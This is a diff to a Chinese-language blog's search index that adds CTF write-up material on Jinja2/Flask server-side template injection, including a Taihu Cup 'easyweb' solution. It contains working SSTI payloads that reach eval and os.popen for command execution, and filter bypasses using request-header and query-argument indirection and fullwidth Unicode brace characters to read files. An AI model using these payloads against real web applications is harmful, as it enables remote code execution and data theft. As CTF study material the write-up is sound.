@@ -77,6 +77,10 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123; [].__class__.__mro__[-1].__subclasses__()[192].__init__.__globals__. __builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;dir()&#39;).read()&quot;)    &#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <h2 id="1-3总结做题的思路："><a href="#1-3总结做题的思路：" class="headerlink" title="1.3总结做题的思路："></a>1.3总结做题的思路：</h2><p>总而言之，我们要么去找builtins函数下的eval，要么去找os。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">str&#x3D; %EF%B9%9B%EF%B9%9Bself.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(request.args.x1).read()%EF%B9%9C%EF%B9%9C</span><br></pre></td></tr></table></figure>
+
+
+
 <h1 id="2-谈谈过滤"><a href="#2-谈谈过滤" class="headerlink" title="2.谈谈过滤"></a>2.谈谈过滤</h1><p>在某些情况下，会遇见各种各样的过滤，比如我们遇见对config的过滤，以及os过滤啊等等</p>
 <h2 id="2-1-过滤了os，system等的情况"><a href="#2-1-过滤了os，system等的情况" class="headerlink" title="2.1 过滤了os，system等的情况"></a>2.1 过滤了os，system等的情况</h2><p>在这种情况下我们也不需慌，如果只是对中括号中可能用到的内容进行过滤的话，我们完全可以通过拼接绕过：</p>
 <p>比如我们之前的payload修改成：</p>
@@ -114,6 +118,13 @@
 <p>之后为了绕过括号的限制，采用这种方法：</p>
 <p>这里给出一个payload：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> []|attr(request.headers.x1)|attr(request.headers.x2)|attr(request.headers.x3)() %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> c|attr(request.headers.x4)==request.headers.x5 %&#125;</span><br><span class="line">    &#123;%<span class="keyword">for</span> d <span class="keyword">in</span> ((c|attr(request.headers.x6)|attr(request.headers.x7))[request.headers.x8])%&#125;</span><br><span class="line">        &#123;%<span class="keyword">if</span> d==request.headers.x9%&#125;&#123;&#123;((c|attr(request.headers.x6)|attr(request.headers.x7))[request.headers.x8])[d](request.headers.x13)&#125;&#125;</span><br><span class="line">        &#123;% endif %&#125;</span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">    &#123;% endif%&#125;</span><br><span class="line">&#123;% endfor %&#125; </span><br><span class="line"></span><br><span class="line">x13: <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()</span><br><span class="line">x9: <span class="built_in">eval</span></span><br><span class="line">x8: __builtins__</span><br><span class="line">x7: __globals__</span><br><span class="line">x6: __init__</span><br><span class="line">x5: catch_warnings</span><br><span class="line">x4: __name__</span><br><span class="line">x3: __subclasses__</span><br><span class="line">x2: __base__</span><br><span class="line">x1: __class__</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-6-过滤了单引号和双引号的情况"><a href="#2-6-过滤了单引号和双引号的情况" class="headerlink" title="2.6 过滤了单引号和双引号的情况"></a>2.6 过滤了单引号和双引号的情况</h2><p>在这种情况下，我们就只能去尝试查找各类的open函数了，没有办法执行命令了，于是查找到：</p>
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">self__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;flag&quot;).read()</span><br></pre></td></tr></table></figure>
+
+<p>之后为了绕过引号的过滤，我们尝试使用request.args.x1的方式进行绕过</p>
+<p>拼凑得：</p>
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">?id=&#123;&#123; self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(request.args.x1).read() &#125;&#125;&amp;x1=flag</span><br></pre></td></tr></table></figure>
 
 ]]></content>
   </entry>
@@ -812,6 +823,35 @@
 
 <p>之后用burp上传，删除的时候读取文件即可：</p>
 <p><img src="mage-20201029161114167.png" alt="image-20201029161114167"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>太湖杯easyweb</title>
+    <url>/2020/11/07/%E5%A4%AA%E6%B9%96%E6%9D%AFeasyweb/</url>
+    <content><![CDATA[<p>感觉太湖杯的题目都挺难的..这次自己制作出来一道题，是一道SSTI，做的时候一开始还以为是nodejs进行命令执行什么的</p>
+<h1 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h1><p>这道题的难点主要是过滤掉了花括号，和双引号等。</p>
+<h1 id="做题思路"><a href="#做题思路" class="headerlink" title="做题思路"></a>做题思路</h1><p>这道题初看就感觉是一道SSTI，但是刚开始的时候被花括号卡住了，搞得我以为是是其他题目，结果相当想到A1CTF独角兽那道题目，才有了思路，首先，我们可以确定的是，我们输入一些花里胡哨的东西会被转换为标准的字符串输出，如图：</p>
+<p><img src="image-20201107195218392.png" alt="image-20201107195218392"></p>
+<p>于是我联想到可以通过输入类似的花括号的utf8编码下的字符串进行绕过：</p>
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">https://www.compart.com/en/unicode/U+FE5C</span><br></pre></td></tr></table></figure>
+
+<p>其中这一行</p>
+<table>
+<thead>
+<tr>
+<th>UTF-8 Encoding:</th>
+<th><code>0xEF 0xB9 0x9C</code></th>
+</tr>
+</thead>
+<tbody><tr>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>我们将0x修改为百分号即可</p>
+<p><img src="image-20201107195633976.png" alt="image-20201107195633976"></p>
+<p>之后就是正常的SSTI了，我们将不需要引号的payload往上上一甩就行了</p>
+<p><img src="image-20201107195717338.png" alt="image-20201107195717338"></p>
 ]]></content>
   </entry>
 </search>
